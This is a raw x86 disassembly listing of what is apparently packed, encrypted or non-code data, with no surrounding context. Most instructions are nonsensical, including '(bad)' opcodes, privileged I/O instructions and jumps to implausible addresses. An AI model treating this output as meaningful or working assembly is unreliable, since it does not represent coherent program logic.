  40b165:	aam    0xeb
  40b167:	pop    ecx
  40b168:	and    al,0xd
  40b16a:	popf   
  40b16b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b16c:	jmp    FWORD PTR [eax-0x7f]
  40b16f:	(bad)  
  40b170:	pop    ebx
  40b171:	pop    esi
  40b172:	xchg   DWORD PTR [eax+eiz*2],edx
  40b175:	into   
  40b176:	add    al,0xa8
  40b178:	push   0x1132d220
  40b17d:	ss push edi
  40b17f:	push   es
  40b180:	rcr    cl,0xfb
  40b183:	jmp    0xb8846459
  40b188:	fwait
  40b189:	xchg   ebp,eax
  40b18a:	loope  0x40b1c4
  40b18c:	jae    0x40b11e
  40b18e:	jecxz  0x40b1f3
  40b190:	dec    BYTE PTR [edx-0x652b57fa]
  40b196:	mov    eax,0xfd4cf2ac
  40b19b:	xor    DWORD PTR [ecx-0x21c93362],edx
  40b1a1:	dec    eax
  40b1a2:	popa   
  40b1a3:	neg    eax
  40b1a5:	dec    ebp
  40b1a6:	je     0x40b1ce
  40b1a8:	adc    DWORD PTR [edi],ebp
  40b1aa:	add    eax,0x8ec5be93
  40b1af:	outs   dx,DWORD PTR ds:[esi]
  40b1b0:	out    0x84,eax
  40b1b2:	dec    esp
  40b1b3:	and    DWORD PTR [eax-0x21],0x4981cfbf
  40b1ba:	cmp    al,0xfa
  40b1bc:	scas   al,BYTE PTR es:[edi]
  40b1bd:	cmp    DWORD PTR [ebx-0x234946b],esi
  40b1c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1c4:	mov    ebp,0xb5521197
  40b1c9:	xchg   esp,eax
  40b1ca:	add    ecx,eax
  40b1cc:	push   ebx
  40b1cd:	or     al,0x28
  40b1cf:	pop    es
  40b1d0:	mov    dh,0x8c
  40b1d2:	xchg   DWORD PTR ds:0x6c35efce,esp
  40b1d8:	pop    ebx
  40b1d9:	pop    ss
  40b1da:	lods   eax,DWORD PTR ds:[esi]
  40b1db:	popa   
  40b1dc:	add    al,0x7d
  40b1de:	lea    ebp,[edx-0x1b]
  40b1e1:	int3   
  40b1e2:	repnz ds xchg ebp,eax
  40b1e5:	sbb    ah,ah
  40b1e7:	sub    al,0x17
  40b1e9:	sbb    DWORD PTR [ebx-0x41],esp
  40b1ec:	push   ds
  40b1ed:	loop   0x40b1cd
  40b1ef:	sub    BYTE PTR [ecx-0x501a94d0],ah
  40b1f5:	pop    esp
  40b1f6:	push   eax
  40b1f7:	call   FWORD PTR [edx]
  40b1f9:	fstp   DWORD PTR [esp+ebx*2+0x36]
  40b1fd:	dec    edi
  40b1fe:	call   0x797b5e47
  40b203:	fwait
  40b204:	xor    BYTE PTR [esi+esi*4+0x77],bl
  40b208:	push   ds
  40b209:	ja     0x40b1d6
  40b20b:	jg     0x40b253
  40b20d:	or     eax,0xe2a0713e
  40b212:	push   ss
  40b213:	cdq    
  40b214:	cmp    al,BYTE PTR [ebx-0x2d]
  40b217:	lea    edx,[edi]
  40b219:	loopne 0x40b273
  40b21b:	gs jl  0x40b1c2
  40b21e:	les    edx,FWORD PTR [ebx]
  40b220:	sub    al,0x67
  40b222:	loop   0x40b202
  40b224:	pop    ebp
  40b225:	outs   dx,BYTE PTR ds:[esi]
  40b226:	xor    esp,DWORD PTR [edx-0x7502051a]
  40b22c:	retf   
  40b22d:	in     eax,dx
  40b22e:	jnp    0x40b24f
  40b230:	les    ecx,FWORD PTR [edi+0x63]
  40b233:	sub    BYTE PTR [edi+0x3b4bfc26],cl
  40b239:	into   
  40b23a:	or     BYTE PTR [esi+ebx*2-0x2e3db2a8],cl
  40b241:	mov    eax,0x83594892
  40b246:	in     eax,0xc8
  40b248:	mov    ds:0x3f7985ef,eax
  40b24d:	bound  esp,QWORD PTR [edi+0x35ddcd8a]
  40b253:	lahf   
  40b254:	repnz shr DWORD PTR [ebp+0x5d],0xf1
  40b259:	or     esp,DWORD PTR [edi]
  40b25b:	xor    dh,BYTE PTR [edx+0x1d]
  40b25e:	xor    BYTE PTR [edi-0x22],0x3
  40b262:	xor    eax,0x187c5d7a
  40b267:	mov    esi,0x9af50e3
  40b26c:	cmp    BYTE PTR [ebx-0x1a7dcbb7],bh
  40b272:	and    al,0xba
  40b274:	xchg   ebp,eax
  40b275:	jo     0x40b294
  40b277:	sahf   
  40b278:	pop    ebx
  40b279:	mov    esi,0x676d0c28
  40b27e:	push   0xcf567505
  40b283:	jbe    0x40b210
  40b285:	sbb    al,0x87
  40b287:	sahf   
  40b288:	dec    ebx
  40b289:	aad    0x3e
  40b28b:	pop    DWORD PTR [ebx-0x3e]
  40b28e:	pop    es
  40b28f:	(bad)  
  40b290:	mov    eax,0x39c6770a
  40b295:	test   al,0x2f
  40b297:	push   esp
  40b298:	jecxz  0x40b29b
  40b29a:	fisttp QWORD PTR [ecx+0x3a03de43]
  40b2a0:	pushf  
  40b2a1:	sbb    eax,0x16b88b29
  40b2a6:	jp     0x40b2bb
  40b2a8:	arpl   WORD PTR gs:[edx],bx
  40b2ab:	xchg   BYTE PTR [ecx],ch
  40b2ad:	test   eax,0xb4d73b70
  40b2b2:	adc    ah,BYTE PTR [edx+0x18592b0b]
  40b2b8:	push   DWORD PTR [ebp+0x53fdbbc7]
  40b2be:	or     ecx,edx
  40b2c0:	sbb    DWORD PTR [ecx+eiz*8-0x1abdfbaf],esp
  40b2c7:	jns    0x40b2cd
  40b2c9:	or     DWORD PTR [edi-0x1a06a1e2],0x33
  40b2d0:	push   cs
  40b2d1:	mov    ds:0xb438a4f0,ax
  40b2d7:	mov    ss,ebp
  40b2d9:	mov    bl,0x93
  40b2db:	scas   eax,DWORD PTR es:[edi]
  40b2dc:	push   cs
  40b2dd:	push   ss
  40b2de:	add    bl,BYTE PTR [edi+edx*1-0x523b6d41]
  40b2e5:	sbb    eax,0x376edd85
  40b2ea:	add    eax,0xf6b7e729
  40b2ef:	or     al,0x6
  40b2f1:	mov    ebx,0x5941b11a
  40b2f6:	mov    esi,0xef143a34
  40b2fb:	push   0xffffffea
  40b2fd:	hlt    
  40b2fe:	je     0x40b341
  40b300:	mov    edx,ebx
  40b302:	or     BYTE PTR [esi-0x5b],0x80
  40b306:	into   
  40b307:	mov    cs,WORD PTR [esi]
  40b309:	cmc    
  40b30a:	fisttp QWORD PTR [ebp-0x7e9c2de8]
  40b310:	loope  0x40b319
  40b312:	dec    ecx
  40b313:	scas   al,BYTE PTR es:[edi]
  40b314:	and    eax,0xa269c739
  40b319:	cwde   
  40b31a:	enter  0x487,0xa8
  40b31e:	out    0x1b,eax
  40b320:	fsub   st,st(7)
  40b322:	mov    al,ds:0x97248679
  40b327:	cmc    
  40b328:	adc    esi,ecx
  40b32a:	repnz (bad) 
  40b32c:	and    dl,BYTE PTR [ecx]
  40b32e:	sbb    BYTE PTR [ecx],0x68
  40b331:	jae    0x40b369
  40b333:	imul   edx
  40b335:	test   al,0xb1
  40b337:	jne    0x40b2d7
  40b339:	mov    BYTE PTR [edi-0x17d997ef],al
  40b33f:	and    al,0xfc
  40b341:	jb     0x40b37e
  40b343:	repnz loopne 0x40b3b6
  40b346:	das    
  40b347:	jge    0x40b2f7
  40b349:	pop    ds
  40b34a:	adc    edx,DWORD PTR [esi]
  40b34c:	mov    si,0x2161
  40b350:	shl    DWORD PTR [edi],0xa1
  40b353:	cld    
  40b354:	lods   al,BYTE PTR ds:[esi]
  40b355:	test   DWORD PTR [ecx+0x1018df03],esp
  40b35b:	cs and eax,0x9ca0d7de
  40b361:	pop    ds
  40b362:	pop    esp
  40b363:	xor    ch,dh
  40b365:	out    dx,eax
  40b366:	pop    esp
  40b367:	retf   0x16fc
  40b36a:	dec    edx
  40b36b:	mov    bl,0x4e
  40b36d:	xor    al,0xa1
  40b36f:	xlat   BYTE PTR ds:[ebx]
  40b370:	dec    eax
  40b371:	mov    al,0xfb
  40b373:	sub    DWORD PTR [esi+ebp*8+0x6a],ecx
  40b377:	fwait
  40b378:	add    eax,0xddbcd198
  40b37d:	push   ebx
  40b37e:	adc    al,0x58
  40b380:	push   ds
  40b381:	sti    
  40b382:	cmp    al,0xf
  40b384:	out    0xf8,al
  40b386:	lds    esi,FWORD PTR [ecx]
  40b388:	or     al,BYTE PTR [ecx+0x28a4e8c8]
  40b38e:	je     0x40b39c
  40b390:	stos   BYTE PTR es:[edi],al
  40b391:	and    ch,BYTE PTR [esi-0x71]
  40b394:	inc    esp
  40b395:	imul   ebp,DWORD PTR [edx+0x29657571],0xacf98bc
  40b39f:	fisubr DWORD PTR [eax]
  40b3a1:	cli    
  40b3a2:	aaa    
  40b3a3:	jne    0x40b3a2
  40b3a5:	and    BYTE PTR [edx],dl
  40b3a7:	int3   
  40b3a8:	daa    
  40b3a9:	sahf   
  40b3aa:	stc    
  40b3ab:	dec    esp
  40b3ac:	mov    edx,0xfa208385
  40b3b1:	inc    edx
  40b3b2:	mov    bh,0xee
  40b3b4:	int    0x7f
  40b3b6:	push   cs
  40b3b7:	scas   al,BYTE PTR es:[edi]
  40b3b8:	dec    eax
  40b3b9:	mov    esi,0xd6c10b9c
  40b3be:	repz fstp TBYTE PTR [ecx]
  40b3c1:	jo     0x40b3a7
  40b3c3:	and    DWORD PTR [ecx+ecx*8+0x7e],0xe00285fa
  40b3cb:	call   0x52e0:0x3a2382cd
  40b3d2:	ja     0x40b43c
  40b3d4:	sbb    DWORD PTR [ebp+0x341b3c95],ebx
  40b3da:	push   edx
  40b3db:	jp     0x40b3b1
  40b3dd:	mov    al,ds:0xfaa38eee
  40b3e2:	cmp    bh,BYTE PTR [eax+0x381f3b69]
  40b3e8:	scas   eax,DWORD PTR es:[edi]
  40b3e9:	pop    eax
  40b3ea:	cmp    BYTE PTR [edx-0x34],bl
  40b3ed:	popf   
  40b3ee:	nop
  40b3ef:	bound  esp,QWORD PTR [edi-0x22]
  40b3f2:	test   BYTE PTR [ecx],dl
  40b3f4:	xchg   ebx,eax
  40b3f5:	(bad)  [esp+ebp*2]
  40b3f8:	call   0xec7c:0x576b2f09
  40b3ff:	out    dx,al
  40b400:	test   al,0xf4
  40b402:	pop    esi
  40b403:	inc    edx
  40b404:	jne    0x40b3a9
  40b406:	pop    ebp
  40b407:	and    DWORD PTR [ebp+0x6a138237],edi
  40b40d:	push   esp
  40b40e:	xchg   edi,eax
  40b40f:	cmp    ebx,DWORD PTR [edx+0x60]
  40b412:	mov    ecx,0x3404109d
  40b417:	sbb    eax,0xf285de16
  40b41c:	jne    0x40b457
  40b41e:	pop    es
  40b41f:	and    DWORD PTR [ecx-0x7a1683e2],0xffffffb4
  40b426:	cmp    al,0x42
  40b428:	pop    ecx
  40b429:	and    DWORD PTR [ebx-0x2d],eax
  40b42c:	xor    esp,DWORD PTR [ebp-0x80]
  40b42f:	or     DWORD PTR [eax],ebx
  40b431:	in     eax,0xe1
  40b433:	test   eax,0x2742018e
  40b438:	test   al,0x5a
  40b43a:	jg     0x40b3e2
  40b43c:	sbb    edi,DWORD PTR ds:0x823e4abe
  40b442:	pop    ss
  40b443:	xchg   edx,eax
  40b444:	sti    
  40b445:	cmc    
  40b446:	ret    
  40b447:	inc    edi
  40b449:	int    0x20
  40b44b:	or     DWORD PTR [edx+0x4e0259e4],edi
  40b451:	jns    0x40b46d
  40b453:	jb     0x40b3d8
  40b455:	add    al,0xf5
  40b457:	cmp    DWORD PTR [ebx+0x7859a8c2],esp
  40b45d:	sahf   
  40b45e:	mov    ah,0xa
  40b460:	mov    ds:0x7b1d0257,al
  40b465:	xchg   esi,eax
  40b466:	xor    dh,0x9d
  40b469:	rol    DWORD PTR [ebp+0x4b],0x5d
  40b46d:	fist   DWORD PTR [ebx+0x27e82df1]
  40b473:	xchg   esp,eax
  40b474:	push   es
  40b475:	leave  
  40b476:	ret    
  40b477:	aaa    
  40b478:	mov    esp,0x22948732
  40b47d:	sbb    eax,0x72dfb968
  40b482:	sub    ch,BYTE PTR ds:0x8f3fed80
  40b488:	and    dl,dl
  40b48a:	jg     0x40b4f4
  40b48c:	arpl   si,cx
  40b48e:	add    ebx,DWORD PTR [ecx]
  40b490:	mov    ebp,0x632c7394
  40b495:	xchg   ebp,eax
  40b496:	adc    DWORD PTR ds:0xdb3dcf99,esp
  40b49c:	pop    ss
  40b49d:	cwde   
  40b49e:	dec    ecx
  40b49f:	sub    esi,ebx
  40b4a1:	into   
  40b4a2:	sub    esp,DWORD PTR [edi+0x2cb90e0c]
  40b4a8:	mov    BYTE PTR [ebp-0x73900f10],dl
  40b4ae:	out    0x2a,eax
  40b4b0:	dec    ebx
  40b4b1:	out    0xe0,al
  40b4b3:	and    BYTE PTR [ebx],0x42
  40b4b6:	push   ss
  40b4b7:	fldcw  WORD PTR [ecx-0x2f8de51f]
  40b4bd:	fld    QWORD PTR [ecx]
  40b4bf:	add    bh,0xe4
  40b4c2:	popa   
  40b4c3:	int    0xbd
  40b4c5:	pop    eax
  40b4c6:	or     ebx,DWORD PTR [edi+0x17]
  40b4c9:	xlat   BYTE PTR ds:[ebx]
  40b4ca:	leave  
  40b4cb:	push   esi
  40b4cc:	lea    ebx,[edi-0x1752e8f4]
  40b4d2:	jbe    0x40b4e5
  40b4d4:	sbb    DWORD PTR [edx],ecx
  40b4d6:	ds push ebx
  40b4d8:	(bad)  
  40b4da:	fsubrp st(2),st
  40b4dc:	jp     0x40b527
  40b4de:	shl    edx,1
  40b4e0:	fistp  DWORD PTR [edi]
  40b4e2:	(bad)  
  40b4e3:	ficomp WORD PTR [esi-0x6065410d]
  40b4e9:	sub    eax,0x3d98ec08
  40b4ee:	sbb    al,dl
  40b4f0:	inc    edi
  40b4f1:	cli    
  40b4f2:	clc    
  40b4f3:	nop    DWORD PTR [ebx-0x52]
  40b4f7:	es ds stos DWORD PTR es:[edi],eax
  40b4fa:	mov    edx,DWORD PTR [edx-0x7d8770c]
  40b500:	mov    al,ds:0xca515a7a
  40b505:	enter  0xd4fb,0x5
  40b509:	push   eax
  40b50a:	mov    WORD PTR [ebp+0x7835879],cs
  40b510:	jns    0x40b4c8
  40b512:	dec    esi
  40b513:	mov    DWORD PTR [edx],eax
  40b515:	sbb    al,0x89
  40b517:	mov    WORD PTR [ecx+0x5],fs
  40b51a:	sub    ebx,eax
  40b51c:	repnz sub edx,esi
  40b51f:	xor    al,0xd5
  40b521:	xor    DWORD PTR [esi],esp
  40b523:	jae    0x40b50b
  40b525:	mov    al,BYTE PTR [edx-0x19]
  40b528:	push   cs
  40b529:	pop    ecx
  40b52a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b52b:	out    dx,al
  40b52c:	add    BYTE PTR [esi],bh
  40b52e:	cmc    
  40b52f:	jb     0x40b59e
  40b531:	inc    esp
  40b532:	dec    ecx
  40b533:	ds pop ds
  40b535:	push   es
  40b536:	add    al,0x92
  40b538:	jg     0x40b5b2
  40b53a:	iret   
  40b53b:	jo     0x40b56c
  40b53d:	mov    WORD PTR [ecx+0x69bc05d4],ss
  40b543:	mov    BYTE PTR [ebx+0x56c8d4f7],cl
  40b549:	js     0x40b539
  40b54b:	fadd   DWORD PTR [ecx]
  40b54d:	(bad)  
  40b54e:	mov    eax,0xb2416ce8
  40b553:	or     ebp,DWORD PTR fs:[edi]
  40b556:	iret   
  40b557:	ret    0x2352
  40b55a:	neg    BYTE PTR [ecx+0x6c85428d]
  40b560:	pop    ecx
  40b561:	test   DWORD PTR gs:[ebx-0x48],0x8cafced3
  40b569:	fs xchg ecx,eax
  40b56b:	icebp  
  40b56c:	mov    edi,0x695a7bb0
  40b571:	mov    ah,0x2
  40b573:	sub    dl,BYTE PTR [esi+0x5c]
  40b576:	lods   eax,DWORD PTR ds:[esi]
  40b577:	jl     0x40b584
  40b579:	jge    0x40b592
  40b57b:	aas    
  40b57c:	adc    ebp,DWORD PTR [edi-0x43]
  40b57f:	sbb    BYTE PTR gs:[eax+0x62],ah
  40b583:	inc    edx
  40b584:	addr16 call 0xcdf89855
  40b58a:	jmp    0x40b52d
  40b58c:	sub    DWORD PTR [ecx],edx
  40b58e:	je     0x40b60f
  40b590:	dec    ebp
  40b591:	inc    edi
  40b592:	cmp    DWORD PTR ds:0x76fc5ad1,edi
  40b598:	jge    0x40b5b3
  40b59a:	int    0xd9
  40b59c:	xchg   esi,eax
  40b59d:	sub    esi,DWORD PTR [edi-0x1a]
  40b5a0:	cmp    ebp,DWORD PTR [edx]
  40b5a2:	mov    ebp,0x836e7eed
  40b5a7:	sub    BYTE PTR [ecx-0x4bfc4af],ah
  40b5ad:	and    al,0x4f
  40b5af:	jbe    0x40b606
  40b5b1:	ja     0x40b5f0
  40b5b3:	pop    ecx
  40b5b4:	sbb    BYTE PTR [ecx],0x37
  40b5b7:	pop    edi
  40b5b8:	es pop esi
  40b5ba:	inc    eax
  40b5bb:	leave  
  40b5bc:	retf   0xba16
  40b5bf:	call   0x4b3562ce
  40b5c4:	sub    eax,0x782e5e5b
  40b5c9:	or     BYTE PTR [edx-0x36b1976b],dh
  40b5cf:	ret    
  40b5d0:	call   0x9cc311
  40b5d5:	in     eax,0x74
  40b5d7:	sub    BYTE PTR [ebx+0x58a563d],ah
  40b5dd:	push   edi
  40b5de:	fdiv   QWORD PTR [ebp-0x6]
  40b5e1:	jb     0x40b5d9
  40b5e3:	pmulhuw mm1,QWORD PTR [edx]
  40b5e6:	xchg   DWORD PTR [ebx+0x16],esi
  40b5e9:	and    BYTE PTR [edx+eax*4],0x5d
  40b5ed:	mov    esi,DWORD PTR [ebp-0x6f]
  40b5f0:	call   FWORD PTR [edx-0x67]
  40b5f3:	adc    bh,BYTE PTR [edx-0xb]
  40b5f6:	push   edi
  40b5f7:	div    BYTE PTR [eax]
  40b5f9:	fs mov esp,0xb5db6e7c
  40b5ff:	xor    eax,0xb294a5ce
  40b604:	pop    es
  40b605:	push   ecx
  40b606:	pop    esi
  40b607:	dec    edx
  40b608:	dec    eax
  40b609:	sar    dh,1
  40b60b:	and    ah,dh
  40b60d:	mov    edx,0x1a9a0316
  40b612:	in     al,dx
  40b613:	push   es
  40b614:	mov    cs,WORD PTR [ebx]
  40b616:	gs leave 
  40b618:	dec    ebx
  40b619:	inc    ebp
  40b61a:	jecxz  0x40b5ae
  40b61c:	into   
  40b61d:	inc    ebp
  40b61e:	test   BYTE PTR [ebp+0x4ca7b9b2],bl
  40b624:	jae    0x40b5ed
  40b626:	or     DWORD PTR [eax-0x23],esi
  40b629:	xor    DWORD PTR [edi],eax
  40b62b:	cs sbb cl,cl
  40b62e:	cld    
  40b62f:	push   ss
  40b630:	repz sub esp,edx
  40b633:	test   DWORD PTR [si+0x5e],0xdc1d4c84
  40b63b:	jl     0x40b6a7
  40b63d:	jp     0x40b616
  40b63f:	les    edx,FWORD PTR [esi-0x18]
  40b642:	mov    ah,0xb8
  40b644:	add    BYTE PTR [ebx],dl
  40b646:	ror    ah,0x19
  40b649:	pop    edx
  40b64a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b64b:	push   ebp
  40b64c:	aad    0xeb
  40b64e:	and    eax,0xf78a7580
  40b653:	jmp    0x40b604
  40b655:	fisttp QWORD PTR [ebp-0x1e]
  40b658:	mov    dh,0xb8
  40b65a:	ror    esp,0x68
  40b65d:	jg     0x40b61b
  40b65f:	xor    BYTE PTR [esi],bl
  40b661:	push   cs
  40b662:	adc    al,0x6f
  40b664:	jecxz  0x40b673
  40b666:	mov    eax,0x413a8c9c
  40b66b:	outs   dx,BYTE PTR ds:[esi]
  40b66c:	add    bl,BYTE PTR [ebx]
  40b66e:	dec    eax
  40b66f:	dec    ecx
  40b670:	ror    DWORD PTR [eax-0x2b627c73],cl
  40b676:	dec    ebp
  40b677:	data16 clc 
  40b679:	jo     0x40b6a8
  40b67b:	call   0x7cf971c1
  40b680:	dec    edx
  40b681:	xchg   edi,eax
  40b682:	or     eax,0xe980d64f
  40b687:	ins    BYTE PTR es:[edi],dx
  40b688:	int    0x2b
  40b68a:	call   0xe7d1b3ca
  40b68f:	(bad)
  40b692:	xor    ch,dh
  40b694:	popa   
  40b695:	or     al,0xfb
  40b697:	repnz bound eax,QWORD PTR [esi]
  40b69a:	dec    ecx
  40b69b:	retf   0x35e2
  40b69e:	in     eax,dx
  40b69f:	scas   al,BYTE PTR es:[edi]
  40b6a0:	in     eax,dx
  40b6a1:	push   eax
  40b6a2:	test   al,0xd7
  40b6a4:	xchg   DWORD PTR [esi],ecx
  40b6a6:	loopne 0x40b669
  40b6a8:	xchg   ebp,eax
  40b6a9:	mov    edx,0x25b3bfda
  40b6ae:	pop    ebp
  40b6af:	fstp   DWORD PTR [esi-0x4d8908f4]
  40b6b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6b6:	pusha  
  40b6b7:	je     0x40b69f
  40b6b9:	adc    DWORD PTR [esi-0x2ca5a14c],esp
  40b6bf:	jp     0x40b6d2
  40b6c1:	mov    ah,dh
  40b6c3:	or     eax,0xf5a3c832
  40b6c8:	dec    eax
  40b6c9:	stc    
  40b6ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b6cb:	mov    ebp,0xb08ae9c7
  40b6d0:	mov    eax,0xd9b2f148
  40b6d5:	outs   dx,BYTE PTR ds:[esi]
  40b6d6:	inc    edx
  40b6d7:	fiadd  WORD PTR [ebp+0x6e]
  40b6da:	cmc    
  40b6db:	loop   0x40b6f2
  40b6dd:	sub    ecx,edi
  40b6df:	gs div cl
  40b6e2:	or     BYTE PTR [ebp-0x2],bl
  40b6e5:	add    al,0xa1
  40b6e7:	js     0x40b6f2
  40b6e9:	push   ebx
  40b6ea:	mov    ah,0x8b
  40b6ec:	pop    ss
  40b6ed:	sub    al,0xb6
  40b6ef:	or     edi,DWORD PTR [eax-0x11fee46d]
  40b6f5:	sbb    edx,DWORD PTR [esp+edi*4-0x40e818c6]
  40b6fc:	test   BYTE PTR [edx+0x14a07cf7],0x46
  40b703:	inc    ecx
  40b704:	and    ebp,DWORD PTR [ebp+esi*1+0x58]
  40b708:	jmp    0x40b709
  40b70a:	and    BYTE PTR [ebx-0x5ed3777d],0x8e
  40b711:	mov    esi,0x6f6c5d59
  40b716:	fwait
  40b717:	cmp    DWORD PTR [esi+0x22452fe5],eax
  40b71d:	and    bl,BYTE PTR [ecx-0x37]
  40b720:	(bad)  
  40b721:	ror    ecx,1
  40b723:	inc    ecx
  40b724:	mov    edi,0xfbdade0e
  40b729:	inc    edi
  40b72a:	repnz or DWORD PTR [esi],0xfffffff8
  40b72e:	pop    ecx
  40b72f:	adc    ebx,0xae2e9ce1
  40b735:	xchg   esp,eax
  40b736:	pop    ecx
  40b737:	dec    edx
  40b738:	repz jecxz 0x40b767
  40b73b:	std    
  40b73c:	outs   dx,DWORD PTR ds:[esi]
  40b73d:	stc    
  40b73e:	aad    0x62
  40b740:	add    BYTE PTR es:[ebp+0x3c],ch
  40b744:	mov    edi,0x271d1409
  40b749:	sti    
  40b74a:	mov    ds:0xd4fa5fbc,eax
  40b74f:	jmp    0x9ad18011
  40b754:	or     dl,cl
  40b756:	xor    BYTE PTR [edx+eiz*2],0x51
  40b75a:	(bad)  
  40b75b:	in     eax,0xed
  40b75d:	data16 cmc 
  40b75f:	int    0xfc
  40b761:	xor    esp,eax
  40b763:	mov    bl,0xa9
  40b765:	sbb    al,0x2b
  40b767:	cli    
  40b768:	xchg   edi,eax
  40b769:	add    eax,0x52f88dbe
  40b76e:	das    
  40b76f:	(bad)  
  40b770:	inc    esi
  40b771:	arpl   WORD PTR [edx],sp
  40b773:	aaa    
  40b774:	not    ebp
  40b776:	shr    BYTE PTR [edi+0x53],cl
  40b779:	sbb    DWORD PTR [ebp+0x779615e],ecx
  40b77f:	sub    edi,DWORD PTR [eax+0x76b72b31]
  40b785:	in     al,0x91
  40b787:	inc    ebp
  40b788:	sbb    esi,edx
  40b78a:	lea    ebx,[eax]
  40b78c:	shr    BYTE PTR [eax],cl
  40b78e:	lea    ebp,[ebx+edi*1+0x3c]
  40b792:	cmp    al,0x35
  40b794:	push   ds
  40b795:	dec    edx
  40b796:	(bad)  
  40b797:	and    al,0xef
  40b799:	ja     0x40b813
  40b79b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b79c:	inc    eax
  40b79d:	and    BYTE PTR [esi+0xcef75f2],ah
  40b7a3:	push   eax
  40b7a4:	xchg   BYTE PTR [edi-0x15],dl
  40b7a7:	ror    ebx,cl
  40b7a9:	xor    eax,0x92371cec
  40b7ae:	imul   ebp,DWORD PTR [ecx-0x6f717b59],0xffffffa1
  40b7b5:	mov    BYTE PTR [eax+0x3c59847e],cl
  40b7bb:	xchg   esp,eax
  40b7bc:	in     al,0x64
  40b7be:	imul   ebx,esp,0xb8f781b2
  40b7c4:	push   cs
  40b7c5:	pop    ss
  40b7c6:	push   eax
  40b7c7:	xor    DWORD PTR [eax-0x4f],eax
  40b7ca:	adc    dh,BYTE PTR [esi]
  40b7cc:	in     eax,dx
  40b7cd:	push   edx
  40b7ce:	fs (bad) 
  40b7d1:	mov    ebp,0x793245a1
  40b7d6:	aam    0x25
  40b7d8:	clc    
  40b7d9:	pop    ds
  40b7da:	push   es
  40b7db:	int    0x92
  40b7dd:	sub    esp,DWORD PTR [ebx+eax*4+0x59fa9cbb]
  40b7e4:	je     0x40b791
  40b7e6:	sbb    DWORD PTR [esi],esp
  40b7e8:	pop    edx
  40b7e9:	scas   eax,DWORD PTR es:[edi]
  40b7ea:	sub    eax,0xd4f1ca44
  40b7ef:	ja     0x40b77d
  40b7f1:	test   eax,0x4601dd01
  40b7f6:	jnp    0x40b7f5
  40b7f8:	jle    0x40b7a2
  40b7fa:	jae    0x40b7b5
  40b7fc:	xchg   WORD PTR [edi],sp
  40b7ff:	pop    ecx
  40b800:	mov    dh,dl
  40b802:	and    cl,BYTE PTR [ebx+0x2b]
  40b805:	sub    bh,BYTE PTR [ecx+0x5798951c]
  40b80b:	pop    es
  40b80c:	adc    DWORD PTR [edx+0x7d],esp
  40b80f:	retf   
  40b810:	mov    ebx,0x600ace78
  40b815:	inc    edi
  40b816:	mul    DWORD PTR [ebp+0x47]
  40b819:	je     0x40b842
  40b81b:	push   ds
  40b81c:	sbb    DWORD PTR [edx-0x5d918a25],edx
  40b822:	push   0x17837cd7
  40b827:	fsub   QWORD PTR [edi-0x21]
  40b82a:	imul   eax,DWORD PTR [ecx-0x6cf067d3],0x56a5294b
  40b834:	xor    eax,0x1b041bce
  40b839:	cmp    eax,0x6db126a5
  40b83e:	test   BYTE PTR [ecx-0x745418],cl
  40b844:	stos   DWORD PTR es:[edi],eax
  40b845:	fdiv   st,st(4)
  40b847:	lahf   
  40b848:	jg     0x40b7e6
  40b84a:	push   esp
  40b84b:	mov    bh,0x7a
  40b84d:	xchg   edx,eax
  40b84e:	fcomp  QWORD PTR [ecx+0x1]
  40b851:	pusha  
  40b852:	add    cl,BYTE PTR ds:0x6076ddcf
  40b858:	ret    0x32ef
  40b85b:	in     al,dx
  40b85c:	mov    fs:0xe6672cc5,al
  40b862:	xor    DWORD PTR [esi],edx
  40b864:	imul   DWORD PTR [ebp+ecx*4+0xd]
  40b868:	inc    esi
  40b869:	ins    BYTE PTR es:[edi],dx
  40b86a:	lea    ebx,[eax]
  40b86c:	mov    ebp,0x1388c590
  40b871:	jecxz  0x40b8ec
  40b873:	ds xchg edx,eax
  40b875:	mov    BYTE PTR [ebx-0x5c5b0d35],al
  40b87b:	sub    BYTE PTR [eax+ebp*2],0x7b
  40b87f:	mov    ebp,0x6ff94dab
  40b884:	jmp    0xd9fb0745
  40b889:	imul   edi,edx,0xffffffcf
  40b88c:	icebp  
  40b88d:	push   ebp
  40b88e:	mov    edx,ebx
  40b890:	aaa    
  40b891:	aad    0x99
  40b893:	pop    edx
  40b894:	mov    edi,0xa7128fed
  40b899:	(bad)  
  40b89a:	jnp    0x40b865
  40b89c:	ret    
  40b89d:	stc    
  40b89e:	push   eax
  40b89f:	jno    0x40b8a5
  40b8a1:	add    ecx,DWORD PTR [edx]
  40b8a3:	xchg   esp,eax
  40b8a4:	sub    dh,BYTE PTR [ebx+0x45]
  40b8a7:	es aas 
  40b8a9:	add    bh,bh
  40b8ab:	add    BYTE PTR ds:0xf86dd014,bh
  40b8b1:	fdiv   DWORD PTR [ecx-0xd]
  40b8b4:	pop    edi
  40b8b5:	aaa    
  40b8b6:	call   0xd9f2d649
  40b8bb:	lock cdq 
  40b8bd:	mov    esi,0x9d0ef9d1
  40b8c2:	dec    ecx
  40b8c3:	adc    edx,DWORD PTR [ecx+0x48]
  40b8c6:	inc    edi
  40b8c7:	mov    esp,DWORD PTR [edi+0x513701c4]
  40b8cd:	lahf   
  40b8ce:	clc    
  40b8cf:	push   esi
  40b8d0:	sahf   
  40b8d1:	pop    esp
  40b8d2:	mov    ch,0xb9
  40b8d4:	or     al,0xae
  40b8d6:	enter  0x3e7f,0x8
  40b8da:	or     al,BYTE PTR [edi-0x96c6081]
  40b8e0:	cld    
  40b8e1:	(bad)  
  40b8e2:	sbb    DWORD PTR [ebp-0x2110d4e3],esp
  40b8e8:	push   eax
  40b8e9:	mov    ebp,0xd0e10043
  40b8ee:	mov    ebx,0x1daf864a
  40b8f3:	repnz in eax,dx
  40b8f5:	mov    dh,0x60
  40b8f7:	icebp  
  40b8f8:	shl    dh,cl
  40b8fa:	mov    bh,0x29
  40b8fc:	fistp  DWORD PTR [edi]
  40b8fe:	sahf   
  40b8ff:	(bad)  
  40b900:	fcmovbe st,st(2)
  40b902:	sub    edi,DWORD PTR [ebx+0x272870e3]
  40b908:	shl    BYTE PTR [ecx+0x74],1
  40b90b:	xchg   ebp,eax
  40b90c:	dec    edi
  40b90d:	inc    edx
